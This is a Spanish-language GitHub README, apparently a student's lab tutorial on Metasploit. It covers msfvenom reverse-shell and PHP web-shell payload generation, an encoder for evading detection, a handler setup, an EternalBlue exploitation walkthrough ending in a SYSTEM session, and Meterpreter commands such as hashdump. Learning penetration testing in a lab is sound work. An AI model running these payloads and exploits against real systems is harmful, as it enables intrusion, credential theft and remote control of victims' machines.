<div align="center">
 
```
███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   
██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   
╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
```
 
# 🛡️ Fundamentos de Metasploit
### Dominando el marco de trabajo para pruebas de penetración
 
**Repositorio de investigación y práctica sobre el uso ético de Metasploit Framework.**  
Desde la configuración del entorno en Kali Linux hasta la explotación controlada con Meterpreter.
 
---
 
[![Metasploit](https://img.shields.io/badge/Tool-Metasploit_Framework-e34c26?style=for-the-badge&logo=metasploit&logoColor=white)](https://metasploit.com)
[![Kali](https://img.shields.io/badge/OS-Kali_Linux-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org)
[![EthicalHacking](https://img.shields.io/badge/Tipo-Ethical_Hacking-00c853?style=for-the-badge&logo=shield&logoColor=white)](https://github.com/)
[![Level](https://img.shields.io/badge/Nivel-Principiante-blue?style=for-the-badge)](https://github.com/)
[![License](https://img.shields.io/badge/License-MIT-lightgrey?style=for-the-badge)](LICENSE)
 
</div>
 
---
 
## ⚠️ Aviso Legal
 
> Este repositorio es **exclusivamente educativo**.  
> Toda práctica documentada se realizó en entornos virtuales controlados y con permiso explícito.  
> El acceso no autorizado a sistemas es **ilegal** y está penado por la ley.  
> Usa este conocimiento únicamente en entornos de laboratorio o con autorización escrita.
 
---
 
## 📑 Tabla de Contenidos
 
- [🔧 Requisitos del Sistema](#-requisitos-del-sistema)
- [🚀 Instalación y Configuración](#-instalación-y-configuración)
- [📹 Video Demostrativo](#-video-demostrativo)
- [🗂️ Arquitectura de Módulos](#️-arquitectura-de-módulos)
- [⌨️ Comandos Básicos](#️-comandos-básicos)
- [🔍 Escaneo de Red](#-escaneo-de-red-y-servicios)
- [📦 Generación de Payloads](#-generación-de-payloads)
- [💣 Configuración del Exploit](#-configuración-del-exploit)
- [🐚 Reverse Shell](#-establecimiento-de-reverse-shell)
- [🧪 Práctica: EternalBlue](#-práctica-explotación-eternalblue-ms17-010)
- [📊 Guía Visual](#-guía-visual)
- [📚 Conclusiones Clave](#-conclusiones-clave)
- [📌 Referencias](#-referencias)
 
---
 
## 🔧 Requisitos del Sistema
 
| Componente | Requisito |
|------------|-----------|
| **SO atacante** | Kali Linux / Parrot OS |
| **SO víctima** | Windows (máquina virtual vulnerable) |
| **RAM** | Mínimo 4 GB (8 GB recomendado) |
| **Disco** | 30 GB libres para VMs |
| **Virtualizador** | VirtualBox o VMware |
| **Lenguaje** | Ruby (incluido en Metasploit) |
| **BD** | PostgreSQL (para persistencia de datos) |
 
---
 
## 🚀 Instalación y Configuración
 
```bash
# Metasploit viene preinstalado en Kali Linux
# Para actualizar:
sudo apt update && sudo apt install metasploit-framework -y
 
# Iniciar sin banner (modo silencioso + privilegios)
sudo msfconsole -q
 
# Inicializar base de datos PostgreSQL
sudo msfdb init
```
 
---
 
## 📹 Video Demostrativo
 
> 🎬 **Demostración completa del flujo de explotación con Metasploit**
 
<!--
  INSTRUCCIONES PARA AGREGAR EL VIDEO:
  
  OPCIÓN 1 — Video en GitHub (recomendado):
  Arrastra y suelta el archivo .mp4 directamente en el editor de GitHub
  al editar este README. GitHub generará el embed automáticamente.
  
  OPCIÓN 2 — Thumbnail clickeable hacia YouTube/Drive:
  Reemplaza la URL de la imagen y el enlace:
  
  [![Demo Metasploit](https://img.shields.io/badge/▶_Ver_Demo-FF0000?style=for-the-badge&logo=youtube)](URL_DEL_VIDEO)
  
  OPCIÓN 3 — HTML embed (si usas GitHub Pages):
  <video width="100%" controls>
    <source src="demo_metasploit.mp4" type="video/mp4">
  </video>
-->
 
<div align="center">
 
```
┌─────────────────────────────────────────────────┐
│                                                  │
│           [ 🎬 INSERTAR VIDEO AQUÍ ]             │
│                                                  │
│   Arrastra tu .mp4 al editor de GitHub o        │
│   reemplaza esta sección con el embed            │
│   generado automáticamente por GitHub.           │
│                                                  │
│   Tamaño recomendado: máx. 100MB                │
│                                                  │
└─────────────────────────────────────────────────┘
```
 
[![Ver Demo](videoplayback.mp4▶_Agregar_Video_Demo-555555?style=for-the-badge)](.)
 
</div>
 
---
 
## 🗂️ Arquitectura de Módulos
 
```
METASPLOIT FRAMEWORK
│
├── auxiliary/      → Escaneo, fuzzing, sniffing, DoS
│   └── scanner/portscan/tcp
│   └── scanner/smb/smb_ms17_010
│
├── exploits/       → Código para abusar vulnerabilidades
│   └── windows/smb/ms17_010_eternalblue
│   └── multi/http/tomcat_mgr_upload
│
├── payloads/       → Scripts que corren en el sistema víctima
│   ├── Singles     → Exploit + Shell en un solo paquete
│   ├── Stagers     → Conexión ligera y confiable
│   └── Stages      → Meterpreter (descargado por Stager)
│
├── encoders/       → Codificadores para evadir detección
│   └── x86/nonalpha
│
├── nops/           → Relleno para estabilizar exploits
│
└── post/           → Módulos post-explotación
    └── getuid, hashdump, download...
```
 
---
 
## ⌨️ Comandos Básicos
 
```bash
# Iniciar consola
sudo msfconsole -q
 
# Ayuda general
msf > help
 
# Buscar módulo o CVE
msf > search eternalblue
msf > search cve:2009-3843
 
# Cargar módulo por nombre o índice
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > use 0
 
# Ver información del módulo
msf exploit > info
 
# Ver y configurar opciones
msf exploit > options
msf exploit > set RHOSTS 192.168.1.51
msf exploit > set LHOST 192.168.1.48
msf exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
# Verificar si el target es vulnerable
msf exploit > check
 
# Ejecutar el exploit
msf exploit > run
msf exploit > exploit
 
# Volver al módulo anterior
msf exploit > back
 
# Salir forzando cierre de sesiones
msf > exit -y
```
 
### Comandos dentro de Meterpreter
 
```bash
meterpreter > getuid          # Ver usuario actual
meterpreter > sysinfo         # Info del sistema
meterpreter > ls              # Listar archivos
meterpreter > cd <ruta>       # Cambiar directorio
meterpreter > download <file> # Descargar archivo
meterpreter > upload <file>   # Subir archivo
meterpreter > shell           # Shell nativa del sistema
meterpreter > hashdump        # Extraer hashes de contraseñas
meterpreter > exit            # Cerrar sesión
```
 
---
 
## 🔍 Escaneo de Red y Servicios
 
```bash
# Escaneo TCP desde Metasploit
msf > use auxiliary/scanner/portscan/tcp
msf auxiliary > set RHOSTS 192.168.1.51
msf auxiliary > set PORTS 1-1000
msf auxiliary > run
 
# Integrar Nmap en Metasploit (guarda en DB)
msf > db_nmap -sV -O -p- 192.168.1.51
 
# Escaneo de vulnerabilidad EternalBlue
msf > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary > set RHOSTS 192.168.1.51
msf auxiliary > run
```
 
---
 
## 📦 Generación de Payloads
 
```bash
# Payload Meterpreter para Windows x64
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP_ATACANTE> \
  LPORT=4444 \
  -f exe > payload.exe
 
# Payload para Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<IP_ATACANTE> \
  LPORT=4444 \
  -f elf > payload.elf
 
# Payload PHP (web shells)
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=<IP_ATACANTE> \
  LPORT=4444 \
  -f raw > shell.php
 
# Excluir byte nulo para mayor compatibilidad
msfvenom -p windows/shell/bind_tcp \
  -b '\x00' \
  -f exe > payload_clean.exe
 
# Con encoder específico
msfvenom -p windows/shell/bind_tcp \
  -e x86/nonalpha \
  -f exe > payload_encoded.exe
```
 
### Tipos de Payload
 
| Tipo | Descripción | Peso |
|------|-------------|------|
| **Singles** | Exploit + Shell en un paquete | ⬆️ Pesado |
| **Stagers** | Establece conexión ligera al atacante | ⬇️ Ligero |
| **Stages** | Descargado por Stager — Meterpreter avanzado | Variable |
 
---
 
## 💣 Configuración del Exploit
 
```bash
# Flujo completo de explotación
msf > search ms17_010
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit > set RHOSTS 192.168.1.51
msf exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit > set LHOST 192.168.1.48
msf exploit > set LPORT 4444
msf exploit > options      # Verificar configuración
msf exploit > check        # Validar vulnerabilidad
msf exploit > run          # Ejecutar
```
 
---
 
## 🐚 Establecimiento de Reverse Shell
 
```
FLUJO DE REVERSE SHELL:
 
  ATACANTE (Kali)                    VÍCTIMA (Windows)
  ─────────────────                  ─────────────────
  msf > use multi/handler            
  set PAYLOAD meterpreter/reverse_tcp
  set LHOST 192.168.1.48    ←──────── payload.exe ejecutado
  set LPORT 4444                               │
  run → [ESCUCHANDO...]     ←──────── conexión entrante
  [*] Meterpreter session opened ✅
```
 
```bash
# Configurar handler para recibir conexión
msf > use exploit/multi/handler
msf exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit > set LHOST <IP_ATACANTE>
msf exploit > set LPORT 4444
msf exploit > run
# [*] Started reverse TCP handler on 192.168.1.48:4444
# [*] Meterpreter session 1 opened ✅
```
 
---
 
## 🧪 Práctica: Explotación EternalBlue (MS17-010)
 
<img src="eternalblue_demo.png" width="100%" alt="Demo EternalBlue en Kali Linux"/>
 
```
Objetivo   : Windows Server 2008 R2 SP1 — 192.168.1.51
CVE        : CVE-2017-0144
Módulo     : exploit/windows/smb/ms17_010_eternalblue
Payload    : windows/x64/meterpreter/reverse_tcp
Resultado  : AUTHORITY\SYSTEM ✅
```
 
```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit > set RHOSTS 192.168.1.51
msf exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit > set LHOST 192.168.1.48
msf exploit > check
# [+] 192.168.1.51:445 - The target is VULNERABLE
msf exploit > run
# [*] ETERNALBLUE overwrite completed successfully (0xC000000D)!
# [*] Meterpreter session opened ✅
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```
 
---
 
## 📊 Guía Visual
 
<img src="metasploit_guia.png" width="100%" alt="Metasploit — Guía Esencial de Explotación"/>
 
<img src="exploit_modules.png" width="100%" alt="Módulos de Exploit en msfconsole"/>
 
---
 
## 📚 Conclusiones Clave
 
### Tarea 1 — Entorno Virtual
- Metasploit existe en versión **community** (gratuita, preinstalada en Kali) y **Pro** (licenciada)
- Las VMs permiten crear entornos atacante-víctima de forma segura y rápida
 
### Tarea 2 — Módulos
- Metasploit se opera desde `msfconsole`
- Los módulos son scripts especializados: `auxiliary`, `exploit`, `payload`, `encoder`, `post`
- Combinados, pueden ser extremadamente potentes
 
### Tarea 3 — Comandos
- `help` → guía de comandos disponibles
- `search` → buscar exploits por nombre o CVE
- `use` → cargar módulo
- `options` → ver parámetros requeridos
- `set` → asignar valores
- `run` / `exploit` → ejecutar
 
### Tarea 4 — Práctica EternalBlue
- Vulnerabilidad activa desde **2017** con exploit disponible en Metasploit
- Proceso: escaneo TCP → validar puerto 445 → scanner SMB → exploit
 
### Tarea 5 — Payloads
- **Singles**: auto-contenidos, pesados pero efectivos
- **Stagers**: conexión ligera hacia el atacante
- **Stages**: descargados por stagers — Meterpreter ofrece acceso avanzado
 
### Tarea 6 — Explotación
- `check` valida vulnerabilidad antes de ejecutar
- Una explotación exitosa entrega sesión `AUTHORITY\SYSTEM`
- Posibles impactos: robo de datos, modificación de archivos, apagado remoto
 
---
 
## 📌 Referencias
 
| Recurso | Descripción |
|---------|-------------|
| [Metasploit Docs](https://docs.metasploit.com/) | Documentación oficial |
| [Rapid7 Blog](https://www.rapid7.com/blog/) | Investigación y módulos nuevos |
| [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144) | EternalBlue — Ficha oficial |
| [Offensive Security](https://www.offensive-security.com/) | Creadores de Kali Linux |
| [VulnHub](https://www.vulnhub.com/) | Máquinas vulnerables para práctica |
| [Hack The Box](https://www.hackthebox.com/) | Laboratorios de pentesting |
 
---
 
## 👤 Autor
 
**Kaleth Corcho**  
Ingeniería de Sistemas · WolvesTI · Bogotá, Colombia
 
[![LinkedIn](https://img.shields.io/badge/LinkedIn-kaleth--corcho-0077B5?style=flat&logo=linkedin)](https://linkedin.com)
[![GitHub](https://img.shields.io/badge/GitHub-kaleth4-181717?style=flat&logo=github)](https://github.com/kaleth4)
 
---
 
<div align="center">
 
**⭐ Si este repositorio te fue útil, dale una estrella**
 
*Proyecto educativo de ciberseguridad · Pentesting · 2026 · WolvesTI*
 
</div>
